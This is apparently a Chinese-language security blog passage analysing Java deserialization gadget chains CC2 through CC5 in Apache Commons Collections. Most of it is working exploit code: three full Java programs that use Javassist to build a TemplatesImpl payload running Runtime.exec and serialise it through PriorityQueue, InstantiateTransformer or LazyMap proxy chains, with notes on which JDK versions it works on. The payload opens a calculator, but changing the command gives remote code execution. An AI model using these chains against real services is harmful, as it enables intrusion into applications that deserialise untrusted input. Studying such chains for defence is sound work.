<p>当我们后期add的时候，会进行size的统计，并将其add的对象放入到queue数组中去；这也自然不会影响到我们链的走向；还有一个点我在编写exp的时候也遇到，我最开始想直接在实力化优先级队列的时候传入TemplatesImpl对象，然后直接进行链条的拼接，但是会触发ClassLoader的错误，导致两个ClassLoader加载同一个class；所以还是首先拿1来进行站位，随后再修改；</p>
<p>放出最后的exp：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.xalan.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> org.apache.xalan.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javassist</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">s1mple</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String AbstractTranslet = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        ClassPool classpool = ClassPool.getDefault();</span><br><span class="line">        classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(s1mple.class));</span><br><span class="line">        classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(s1mple.class));</span><br><span class="line">        CtClass s2mple = classpool.get(s1mple.class.getName());</span><br><span class="line">        CtClass s3mple = classpool.get(Class.forName(AbstractTranslet).getName());</span><br><span class="line">        s2mple.setSuperclass(s3mple);</span><br><span class="line">        s2mple.makeClassInitializer().insertAfter(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>);<span class="comment">//弹出计算器；；</span></span><br><span class="line">        <span class="keyword">byte</span>[] bt = s2mple.toBytecode();</span><br><span class="line"></span><br><span class="line">        Class templatesimpl = Class.forName(TemplatesImpl);</span><br><span class="line">        Constructor constructor= templatesimpl.getConstructor();</span><br><span class="line">        Object temp = constructor.newInstance();</span><br><span class="line">        <span class="comment">//Object temp = new TemplatesImpl();两种写法含义相同；结果也相同；</span></span><br><span class="line"></span><br><span class="line">        Field name = templatesimpl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(temp,<span class="string">&quot;s1mple_hack&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecode = templatesimpl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecode.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecode.set(temp,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bt&#125;);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priority = <span class="keyword">new</span> PriorityQueue();</span><br><span class="line">        priority.add(<span class="number">1</span>);</span><br><span class="line">        priority.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        TransformingComparator trans = <span class="keyword">new</span> TransformingComparator(<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;));</span><br><span class="line">        Class pri = priority.getClass();</span><br><span class="line">        Field que = pri.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        que.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] innerArr = (Object[]) que.get(priority);</span><br><span class="line">        innerArr[<span class="number">0</span>] = temp;</span><br><span class="line">        innerArr[<span class="number">1</span>] = temp;</span><br><span class="line">        Field com = pri.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        com.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        com.set(priority,trans);</span><br><span class="line">        ObjectOutputStream shuchu = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;a.bin&quot;</span>));</span><br><span class="line">        shuchu.writeObject(priority);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>到此CC2已经分析完成，这里顺便记录一下CC3的整体流程，因为CC3和CC2其原理基本类似，也就是将其利用的类换了一个，其实本质上还是调用了newInstance方法去进行实力化我们的恶意的class达到rce；</p>
<h2 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h2><p>其变化的点是InvokerTransformer类换成了InstantiateTransformer类，这里追溯下InstantiateTransformer类下的transform方法；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> T <span class="title">transform</span><span class="params">(Class&lt;? extends T&gt; input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a null object&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Constructor&lt;? extends T&gt; con = input.getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException var3) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InstantiationException var4) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, var4);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, var5);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>不同版本的jdk其源码写法有差异，我的版本是java8u112；</p>
<p>简单的审计下不难发现是将input传入的Class对象进行了实力化操作；通过反射拿到input也即是传入的Class对象的构造器；获得传入形参的类型，然后newInstance进行调用；直接实力化对象；</p>
<h3 id="直接放出exp，没啥好说的；"><a href="#直接放出exp，没啥好说的；" class="headerlink" title="直接放出exp，没啥好说的；"></a>直接放出exp，没啥好说的；</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.xalan.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> org.apache.xalan.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.xalan.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC3</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">s1mple</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String AbstractTranslet = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        ClassPool classpool = ClassPool.getDefault();</span><br><span class="line">        classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(s1mple.class));</span><br><span class="line">        classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(s1mple.class));</span><br><span class="line">        CtClass s2mple = classpool.get(s1mple.class.getName());</span><br><span class="line">        CtClass s3mple = classpool.get(Class.forName(AbstractTranslet).getName());</span><br><span class="line">        s2mple.setSuperclass(s3mple);</span><br><span class="line">        s2mple.makeClassInitializer().insertAfter(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] bt = s2mple.toBytecode();</span><br><span class="line">        Class templatesimpl = Class.forName(TemplatesImpl);</span><br><span class="line">        Constructor constructor= templatesimpl.getConstructor();</span><br><span class="line">        Object temp = constructor.newInstance();</span><br><span class="line">        <span class="comment">//Object temp = new TemplatesImpl();</span></span><br><span class="line"></span><br><span class="line">        Field name = templatesimpl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(temp,<span class="string">&quot;s1mple_hack&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecode = templatesimpl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecode.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecode.set(temp,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bt&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//////////</span></span><br><span class="line">        PriorityQueue priority = <span class="keyword">new</span> PriorityQueue();</span><br><span class="line">        <span class="comment">//System.out.println(priority);</span></span><br><span class="line">        priority.add(<span class="number">1</span>);</span><br><span class="line">        priority.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        InstantiateTransformer instan = <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="keyword">new</span> Object[]&#123;temp&#125;);</span><br><span class="line">        Transformer instans = (Transformer)instan;</span><br><span class="line">        TransformingComparator trans = <span class="keyword">new</span> TransformingComparator(instans);</span><br><span class="line">        Class pri = priority.getClass();</span><br><span class="line">        Field com = pri.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        com.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        com.set(priority,trans);</span><br><span class="line">        Field que = pri.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        que.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Class TrA = TrAXFilter.class;</span><br><span class="line"></span><br><span class="line">        Object[] innerArr = (Object[]) que.get(priority);</span><br><span class="line"></span><br><span class="line">        innerArr[<span class="number">0</span>] = TrA;</span><br><span class="line">        innerArr[<span class="number">1</span>] = TrA;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ObjectOutputStream shuchu = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;a.bin&quot;</span>));</span><br><span class="line">        shuchu.writeObject(priority);</span><br><span class="line">      <span class="comment">//test一下</span></span><br><span class="line">        ObjectInputStream test = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;a.bin&quot;</span>));</span><br><span class="line">        test.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>唯一的遗憾是，中途碰到了个弱智的视力问题，因为没看清楚代码，导致了exp推迟两个小时出，中途还为学校的一些事伤脑没认真看，中途一直在debug，太糙了；；要不然可以根据之前的exp一分钟出，裂开；；</p>
<h2 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h2><h2 id="exp-思考"><a href="#exp-思考" class="headerlink" title="exp+思考"></a>exp+思考</h2><p>这个链条也挺简单的，只是将我们前半部分的利用链换成了我们CC链1当中的利用链条；去调用任意类下的任意方法，这里直接去调用到我们最后Transformer类下的newTransformer方法去加载我们的恶意class；本质还是一样的，只不过是组合不一样而已；拿着之前写的exp稍微改改就成了新的exp；但是这个exp和之前的第一版本的exp一样，都是对jdk的版本有要求，在拿u66及以下版本的时候可以成功运行，</p>
<p>最开始跑的时候没结果，还以为写的有问题，后来想了下之前cc1的时候因为版本限制导致readObject下的memberValue被篡改而导致无法进行代理的完成。而cc4和cc1基本前部流程一样，那就直接换版本为u66（因为这个前期的链条在高版本中修复），进行运行弹出计算器；success；；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.xalan.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC4</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">s1mple</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String AbstractTranslet = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br><span class="line">        String TemplatesImpl = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        ClassPool classpool = ClassPool.getDefault();</span><br><span class="line">        classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(s1mple.class));</span><br><span class="line">        classpool.insertClassPath(<span class="keyword">new</span> ClassClassPath(s1mple.class));</span><br><span class="line">        CtClass s2mple = classpool.get(s1mple.class.getName());</span><br><span class="line">        CtClass s3mple = classpool.get(Class.forName(AbstractTranslet).getName());</span><br><span class="line">        s2mple.setSuperclass(s3mple);</span><br><span class="line">        s2mple.makeClassInitializer().insertAfter(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] bt = s2mple.toBytecode();</span><br><span class="line">        Class templatesimpl = Class.forName(TemplatesImpl);</span><br><span class="line">        Constructor constructor= templatesimpl.getConstructor();</span><br><span class="line">        Object temp = constructor.newInstance();</span><br><span class="line"></span><br><span class="line">        Field name = templatesimpl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(temp,<span class="string">&quot;s1mple_hack&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecode = templatesimpl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecode.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecode.set(temp,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bt&#125;);</span><br><span class="line"></span><br><span class="line">        String Annotation = <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line">        String lazy = <span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>;</span><br><span class="line">        String invoke = <span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] tran = <span class="keyword">new</span> Transformer[]&#123;<span class="keyword">new</span> ConstantTransformer(temp),<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>)&#125;;</span><br><span class="line">        Transformer chaintransform = <span class="keyword">new</span> ChainedTransformer(tran);</span><br><span class="line"></span><br><span class="line">        HashMap hashmap = <span class="keyword">new</span> HashMap&lt;String,String&gt;();</span><br><span class="line"></span><br><span class="line">        Class Lazy = Class.forName(lazy);</span><br><span class="line">        Constructor lazycon = Lazy.getDeclaredConstructor(Map.class, Transformer.class);</span><br><span class="line">        lazycon.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object lay = lazycon.newInstance(hashmap,chaintransform);<span class="comment">//调用chaintrsfrom下的for循环；</span></span><br><span class="line">        Map lays = (Map)lay;</span><br><span class="line"></span><br><span class="line">        Class Annotations = Class.forName(Annotation);</span><br><span class="line">        Constructor constructor1 = Annotations.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object s1mple = constructor1.newInstance(Override.class,lays);<span class="comment">//调用get；</span></span><br><span class="line">        InvocationHandler ssdd = (InvocationHandler)s1mple;<span class="comment">//强行转化 ；</span></span><br><span class="line"></span><br><span class="line">        Map proxy = (Map)Proxy.newProxyInstance(lay.getClass().getClassLoader(),lay.getClass().getInterfaces(),ssdd);</span><br><span class="line">        InvocationHandler smple = (InvocationHandler)constructor1.newInstance(Override.class,proxy);<span class="comment">//invoke</span></span><br><span class="line">        ObjectOutputStream yy = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;aa.bin&quot;</span>));</span><br><span class="line">        yy.writeObject(smple);</span><br><span class="line">        ObjectInputStream what = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;aa.bin&quot;</span>));</span><br><span class="line">        what.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h2><p>这个链条虽说可以和前面的链条利用方式区别开，但是我感觉从本质上来说也只是换了种get的触发方法；网上的链条是利用新的触发get点和CC1的后半段进行连接，这里我简单的做了和CC2做个链接，自己简单的做了个挖掘；本身上还是换汤不换药；来看下；新引入的类为BadAttributeValueExpException和TiedMapEntry类；来看下内容；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">    Object valObj = gf.get(<span class="string">&quot;val&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        val = <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>来简单的看下，valObj是拿到val后赋值；然后判断其是否为空，如果为空则val赋值为null；否则将进行其他if判断，当SecurityManager未设置的时候会直接满足，调用valObj下的toString方法；这里引入TiedMapEntry类；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getKey() + <span class="string">&quot;=&quot;</span> + <span class="keyword">this</span>.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里发现调用了getKey和getValue方法；追溯看看；</p>
